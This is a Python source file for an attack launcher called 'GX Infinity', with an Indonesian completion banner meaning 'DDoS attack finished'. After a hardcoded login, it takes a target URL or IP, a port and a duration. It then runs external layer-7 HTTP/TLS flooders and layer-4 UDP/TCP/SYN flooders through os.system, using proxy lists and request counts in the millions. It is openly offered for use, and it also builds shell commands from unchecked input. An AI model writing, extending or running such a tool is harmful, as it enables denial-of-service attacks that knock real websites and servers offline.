# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[0;33m' #KUNING
P = '\033[0;94m' #BIRU

def menu():
	os.system ("clear")
	print("""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
 / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[37m| |_| |>  <   | || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ |___|_| |_|_|   |_|_| |_|___|\__|\__, |
                                              |___/
\033[37m➲                   TYPE:

\033[0;33m➲ L4    ➠ TO VIEW AND USE THE METHOD LAYER - 4
\033[0;33m➲ L7    ➠ TO VIEW AND USE THE METHOD LAYER - 7

\033[37m[LAYER-7]                   [LAYER-4]
\033[35m• GX [\033[32mVIP\033[35m]                  • OVH [\033[32mVIP\033[35m]
\033[35m• HTTPS-STORM [\033[32mVIP\033[35m]         • POWT [\033[32mVIP\033[35m]
\033[35m• HTTPS-STORM2 [\033[32mVIP\033[35m]        • TCP-BYPASS [\033[32mVIP\033[35m]
\033[35m• TLS [\033[32mVIP\033[35m]                 • TCP [\033[32mVIP\033[35m]
\033[35m• TLS2 [\033[32mVIP\033[35m]                • NET [\033[32mVIP\033[35m]
\033[35m                            • NET [\033[32mVIP\033[35m]
""")
def XC():
	os.system ("clear")
	print("""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
 / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[37m| |_| |>  <   | || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ |___|_| |_|_|   |_|_| |_|___|\__|\__, |
                                              |___/

\033[0;33m[ MENU GX INFINITY ]
TYPE " BACK " TO SEE COMMANDS AGAIN !
NOTE USE :

\033[37m[ LAYER - 7]
🎭 \x1b[38;2;255;20;147mGX \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m]
🎭 \x1b[38;2;255;20;147mHTTPS-STORM \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m]
🎭 \x1b[38;2;255;20;147mHTTPS-STORM2 \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m]
🎭 \x1b[38;2;255;20;147mTLS \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m]
🎭 \x1b[38;2;255;20;147mTLS2 \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m]

\033[0;33mSpecial Method Power By RaditX7
""")
def L4():
	os.system ("clear")
	print("""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
 / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[37m| |_| |>  <   | || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ |___|_| |_|_|   |_|_| |_|___|\__|\__, |
                                              |___/

\033[0;33m[ MENU GX INFINITY ]
TYPE " BACK " TO SEE COMMANDS AGAIN !
NOTE USE :

\033[37m[ LAYER - 4]
🎭 \x1b[38;2;255;20;147mOVH \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mPOWT \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mTCP-BYPASS \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mTCP \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mNET \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mWIZ \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]
🎭 \x1b[38;2;255;20;147mXYN \033[35m[\033[32mURL\033[35m] [\033[32mPORT\033[35m] [\033[32mTIME\033[35m] [\033[32mMETHOD\033[35m]

\033[0;33mMETHOD : [CONNECT/GET/POST/HEAD]
Special Method Power By RaditX7
""")

def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] GX :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input(Fore.LIGHTGREEN_EX+"╔═══"+Fore.CYAN+"[""\x1b[38;2;255;20;147mRoot""\x1b[38;2;255;20;147m@""\x1b[38;2;255;20;147mX7"+Fore.CYAN+"]"
+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
		sinput = sin.split(" ")[0]
		if sinput == "back" or sinput == "BACK":
			os.system ("clear")
			menu()
		if sinput == "l4" or sinput == "L4":
			os.system ("clear")
			L4()
		if sinput == "l7" or sinput == "L7":
			os.system ("clear")
			XC()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()
#########LAYER-7_By RaditX7########
		elif sinput == "GX" or sinput == "GX":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'go run GX.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mGX SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mRaditX7 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh RaditX7 GX \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https-storm" or sinput == "HTTPS-STORM":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'go run HTTPS-STORM.go {url} 1000000 post {time} header.txt')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mGX SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mRaditX7 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh RaditX7 GX \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https-storm2" or sinput == "HTTPS-STORM2":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'go run HTTPS-STORM.go {url} 1000000 get {time} header.txt')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mGX SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mRaditX7 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh RaditX7 GX \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'node TLS_HTTP2.js {url} {time} 23 1000000 proxy.txt')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mGX SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mRaditX7 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh RaditX7 GX \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls2" or sinput == "TLS2":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'node TLS_HTTP2.js {url} {time} {port} 1000000 proxy.txt')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mGX SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mRaditX7 \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh RaditX7 GX \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
#########LAYER-4_By RaditX7########
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ovh" or sinput == "OVH":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./ovhudp2 {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mOVH \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "powt" or sinput == "POWT":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./PowerTime {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mPOWT \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp-bypass" or sinput == "TCP-BYPASS":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./tcpbypass {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mTCP-BYPASS \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./TCPv3 {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mTCP \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "net" or sinput == "NET":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./telnet {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mNET \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "wiz" or sinput == "WIZ":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./wizard {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mWIZ \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "xyn" or sinput == "XYN":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd L4 && ./xsyn {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\x1b[38;2;255;20;147m  ____        ___       _____ _       ___ _
\x1b[38;2;255;20;147m / ___|_  __ |_ _|_ __ |  ___(_)_ __ |_ _| |_ _   _
\x1b[38;2;255;20;147m| |  _\ \/ /  | || '_ \| |_  | | '_ \ | || __| | | |
\033[35m| |_| |>  <   \033[37m| || | | |  _| | | | | || || |_| |_| |
\033[35m \____/_/\_\ \033[35m|___|_| |_|_|   |_|_| |_|___|\__|\__, |
\033[35m                                              |___/
\033[0;94m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                   IP       : \033[0;33m[ \033[0;94m{ip}  \033[0;33m]
\033[0;94m                   PORT     : \033[0;33m[ \033[0;94m{port} \033[0;33m]
\033[0;94m                   METHOD   : \033[0;33m[ \033[0;94m{method} \033[0;33m]
\033[0;94m                   TIME     : \033[0;33m[ \033[0;94m{time} \033[0;33m]
\033[0;94m                   LAYER-4  : \033[0;33m[ \033[0;94mXYN \033[0;33m]
\033[0;94m                   VIP      : \033[0;33m[ \033[32mTrue \033[0;33m]
\033[0;94m                   USER     : \033[0;33m[ \033[0;94mRaditX7 \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")

			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "X7"
    passwd = "."
    username = input("""





    
                
                           🎭 \33[0;32mLOGIN TO GX : """)
    password = getpass.getpass(prompt="""                  
                           🎭 \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""️\033[1;31;40mPASSWORDS SALAH""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                           ⚡ \33[0;32mTO GX TOOLS""")
        time.sleep(0.3)
    menu()
    main()
    

login()